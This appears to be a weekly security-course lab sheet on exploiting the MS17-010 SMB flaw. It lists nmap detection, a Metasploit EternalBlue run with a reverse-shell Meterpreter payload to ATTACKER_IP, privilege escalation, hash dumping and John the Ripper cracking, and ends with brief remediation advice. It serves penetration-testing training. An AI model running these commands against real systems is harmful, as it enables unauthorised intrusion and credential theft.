# SMB Exploitation with Metasploit (Week 6)

## Objective
Identify SMB vulnerabilities (MS17-010), exploit with Metasploit, gain Meterpreter, dump hashes, crack with John, and recommend remediation.

## Recon
```bash
nmap -p445 --script=smb-vuln-ms17-010 TARGET_IP -oA scans/smb_ms17
```

## Exploit
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run
```

## Post-Exploitation
```bash
meterpreter> getsystem
meterpreter> hashdump
```
Crack:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Remediation
- Patch systems, disable SMBv1, network segmentation, LAPS for local admin mgmt, strong passwords/MFA.

## Deliverables
- Evidence of exploit (session), hashes, cracked creds, and policy changes.

